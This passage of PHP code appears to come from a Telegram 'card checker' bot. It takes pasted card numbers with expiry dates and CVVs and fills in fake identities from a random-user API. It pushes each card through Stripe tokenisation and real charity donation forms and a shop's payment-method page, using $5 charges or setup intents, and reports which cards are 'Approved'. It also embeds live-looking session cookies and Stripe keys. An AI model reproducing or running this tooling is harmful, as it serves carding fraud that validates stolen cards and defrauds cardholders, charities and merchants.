  CURLOPT_URL => 'https://environmentvictoria.org.au/give/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'referer: https://environmentvictoria.org.au/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);

curl_close($curl);

preg_match('/_wpnonce" value="([^"]+)"/', $response, $match);
$nonce = $match[1];

echo "$nonce\n"; // imprime: d144ae23a1


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://environmentvictoria.org.au/give/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'donations_action=donation&donation%5Bbraintree_token%5D=55&donation%5Bpaypal_nonce%5D=&donation%5Bpage_id%5D=244&donation%5Bcampaign%5D=&donation%5Bthankyou%5D=https%3A%2F%2Fenvironmentvictoria.org.au%2Fgive%2Fthank-you%2F&_wpnonce='.$nonce.'&_wp_http_referer=%2Fgive%2F&donation%5Brecurring%5D=0&donation%5Bother-amount%5D=5&user%5Bfirst_name%5D='.$name.'&user%5Blast_name%5D='.$last.'&user%5Bstreet_address%5D='.$street.'&user%5Bcity%5D='.$city.'&user%5Bstate%5D=VIC&user%5Bpostcode%5D='.$postcode.'&user%5Bphone%5D='.$phone.'&user%5Bemail%5D='.$email.'&card_number='.$cc.'&card_expiry='.$mes.'%2F'.$ano.'&card_cvv='.$cvv.'&donation%5Bemail%5D=&donation%5Bstreet_address%5D=&donation%5Bcity%5D=&donation%5Bstate%5D=&donation%5Bpostcode%5D=&donation%5Bcountry%5D=&donation%5Bname%5D=&donation%5Bfirst_name%5D=&donation%5Blast_name%5D=&donation%5Bphone%5D=&donation%5Bpayment_method%5D=&donation%5Bnew_donation%5D=1&donation%5Bsalesforce_contact_id%5D=&donation%5Bamount%5D=5&donation%5Bsalesforce_campaign_id%5D=&donation%5Bsalesforce_campaign_name%5D=Give+page&device_data=%7B%22device_session_id%22%3A%222f2e7d7f5b090e2b08ce13fd98eadeb0%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22891ff729547f44f23fe6a2ded11da524%22%7D',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'origin: https://environmentvictoria.org.au',
    'referer: https://environmentvictoria.org.au/give/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$parts = explode('<li class="payment-error error">', $response);
$respo = explode('</li>', $parts[1])[0];

curl_close($curl);


$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";




// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    editMessage($chat_id, $respuesta, $id_text);
} else {
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


 }










elseif((strpos($message, "!go") === 0)||(strpos($message, "/go") === 0)||(strpos($message, ".go") === 0)){
//$lista = preg_replace('/\s+/', '', $lista);
$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = trim($i[0]);
$mes   = trim($i[1]);
$ano  = trim(substr($i[2], -2));
$cvv   = trim($i[3]);
$lista = "$cc|$mes|$ano|$cvv";

$bin = substr($lista, 0, 6);
$ma = "$mes/$ano1";
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//



$longitud_cc = (substr($cc, 0, 2) == "37" || substr($cc, 0, 2) == "34") ? 15 : 16;
if (!is_numeric($cc) || strlen($cc) != $longitud_cc || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /go CC|MM|YYYY|CVV\n";
    sendMessage($chat_id, $respuesta, $message_id);
    die();
}



//Verifi//
/*
if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /go CC|MM|YYYY|CVV\n";
    sendMessage($chat_id, $respuesta, $message_id);
    die();
}

*/

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin



//RANDOM USER//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$get = curl_exec($ch);
curl_close($ch);
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];

////SACA EL TOKEN//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F3d0d0fc67%3B+stripe-js-v3%2F3d0d0fc67&time_on_page=63244&key=pk_live_41FIHoENH2ilJLW1pkGdu3wb&pasted_fields=number');
$response = curl_exec($ch);
$err = curl_error($ch);
$json = json_decode($response, true);
$token = $json["id"];
$ip = $json["client_ip"];
curl_close($ch);

//---------------PRUEBA LAS CCS EN PAGINA DE DONACION---------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://goodbricksapp.com/icsd.org/donate');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'g-recaptcha-response=03ANYolqtrAXy5zIt2AjPl_v86EhHB_0O8YEgRQ73dmNp0E6rS3OaDFJqwYHwDoSLyD6Z9plsGVb3XvVAqEvqVWJTNX-YDYXAx2ynIggYNEIE5ns3byzDEIOJMghcj6qkmnzTyM4nzk3XRnSeqndz8VbvON0ctHxIbblzlqdtAwfNLKyYN3Z4QvcOqK8RmrhIJNInTgDRBAXqo8cCS3hg2xlDTbuzXSS1EV4WAlTE0yIyUVAs27f63DSS4MRZL-jX8ifTCcHmDgX3sKX92atN3k3vI91QTJ8TGmPkcuWTj4xgBnktDyFxQSIPMY2yORw5d90yIDfUHQV62ZAn3TQvZ0l_psLuVhs15xrah2ZGuA-qTBuAhAM64qn8WXaw2YCXQMG1rU4RkUeYm3PvsV0_Yxq9aBzDMC7g6aySQP-1RUw2AA6Ma7yTWvhdwL7tWcs7iy6-5fWF86dIb2tBujmSMzwfr4EdOZ1PD4Q&token='.$token.'&clientIp='.$ip.'&categoryAmount=5&paymentIterations=0&categoryName=funeral+expenses&firstName='.$name.'&lastName='.$last.'&email='.$email.'&customerEmailValidation=&phone='.$phone.'&address=true&addressStreet='.$street.'&addressApt=&addressCity='.$city.'&addressState='.$state.'&addressZipCode='.$postcode.'');

$response = curl_exec($ch);
$err = curl_error($ch);
$json = json_decode($response, true);
$respo = $json["status"];

if (empty($respo)){
$respo = explode(';', $json['message'])[0];
}

curl_close($ch);

$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";


if (empty($respo)) {
        $respo = $response;
}
if ($respo == "SUCCEEDED"){
    $respo = "Charged $5";
}
// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
$logo = "<a href='http://t.me/XNazunaBot'>[↯]</a>";

if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: GATE ERROR ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    editMessage($chat_id, $respuesta, $id_text);
} else {
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


 }




elseif((strpos($message, "!wo") === 0)||(strpos($message, "/wo") === 0)||(strpos($message, ".wo") === 0)){
$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = trim(substr($i[2], -2));
$cvv   = $i[3];

$lista = "$cc|$mes|$ano|cvv";


$bin = substr($lista, 0, 6);
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//


//Verifi//
if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /wo CC|MM|YYYY|CVV\n";
    sendMessage($chat_id, $respuesta, $message_id);
    die();
}



//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
        //----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

$longitud = 4;
$partes = [];
for ($i = 0; $i < strlen($cc); $i += $longitud) {
    $parte = substr($cc, $i, $longitud);
    $partes[] = $parte;
}

////EXTRAE EL NONCE////
$cc = implode('+', $partes);


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.hollywoodexpendables.com/my-account/payment-methods/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-27%2019%3A37%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-27%2019%3A37%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; __stripe_mid=e8840e00-a679-4d73-8457-4388262e24a5a397d3; __stripe_sid=aec8464c-ef94-48a8-baa4-952f5c4f15f6b142ae; wordpress_logged_in_3efb2a5bb3559a2902dbffae45726d30=Rigo%20Lopez%7C1735501274%7CurxsLaoCkzeiZFLcKow3sfim63XiB9qRWQ4iSJosGTB%7Cb687215ea8543185629b3a86b2d8c90ecf663779dd5aef422d0930b53cee0454; wfwaf-authcookie-91172c47aa3700744a7ba5a826d5c151=2594%7Cother%7Cread%7Cf05fe5457117c7f43aedd2bdf4efb34bfed800301389cb5bd3ff347098c13c5b; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'cache-control: max-age=0',
    'upgrade-insecure-requests: 1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.8',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-dest: document',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'referer: https://www.hollywoodexpendables.com/my-account/add-payment-method/',
    'priority: u=0, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/createAndConfirmSetupIntentNonce":"([a-zA-Z0-9]+)"/';
preg_match($patron, $response, $coincidencias);
$nonce = $coincidencias[1];
/////
$patron = '/pk_live_[a-zA-Z0-9]*/';
preg_match($patron, $response, $coincidencia);
$pk_live = $coincidencia[0];
curl_close($curl);

/////EXTRAE EL ID//

echo "$nonce\n";
echo "$pk_live\n";

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10010&billing_details%5Baddress%5D%5Bcountry%5D=US&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.hollywoodexpendables.com&time_on_page=47709&client_attribution_metadata%5Bclient_session_id%5D=555e488b-ae32-4b18-b81b-18fa0cb28a3f&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=842c073e-0d00-4a60-9629-653d2e680b0e2f7dcc&muid=e8840e00-a679-4d73-8457-4388262e24a5a397d3&sid=aec8464c-ef94-48a8-baa4-952f5c4f15f6b142ae&key=pk_live_3aQeYWJrvX0nCYSR0VstU8rL&_stripe_version=2024-06-20',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.8',
    'origin: https://js.stripe.com',
    'sec-fetch-site: same-site',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://js.stripe.com/',
    'priority: u=1, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$id = $json["id"];
curl_close($curl);
echo "$id\n";
////HACE EL AUTH///


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.hollywoodexpendables.com?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'action=create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce='.$nonce.'',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-27%2019%3A37%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-27%2019%3A37%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; __stripe_mid=e8840e00-a679-4d73-8457-4388262e24a5a397d3; __stripe_sid=aec8464c-ef94-48a8-baa4-952f5c4f15f6b142ae; wordpress_logged_in_3efb2a5bb3559a2902dbffae45726d30=Rigo%20Lopez%7C1735501274%7CurxsLaoCkzeiZFLcKow3sfim63XiB9qRWQ4iSJosGTB%7Cb687215ea8543185629b3a86b2d8c90ecf663779dd5aef422d0930b53cee0454; wfwaf-authcookie-91172c47aa3700744a7ba5a826d5c151=2594%7Cother%7Cread%7Cf05fe5457117c7f43aedd2bdf4efb34bfed800301389cb5bd3ff347098c13c5b; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'x-requested-with: XMLHttpRequest',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'sec-ch-ua-mobile: ?1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.8',
    'origin: https://www.hollywoodexpendables.com',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://www.hollywoodexpendables.com/my-account/add-payment-method/',
    'priority: u=1, i',
  ],
]);
	
$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$message = str_replace("Error: ", "", $json['data']['error']['message']);
$success = $json['success'];
$status = $json['data']['status'];
curl_close($curl);

if ($success === true && $status === "succeeded") {
    $respo = "1000: Approved!";

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.hollywoodexpendables.com/my-account/payment-methods/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-27%2019%3A37%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-27%2019%3A37%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; 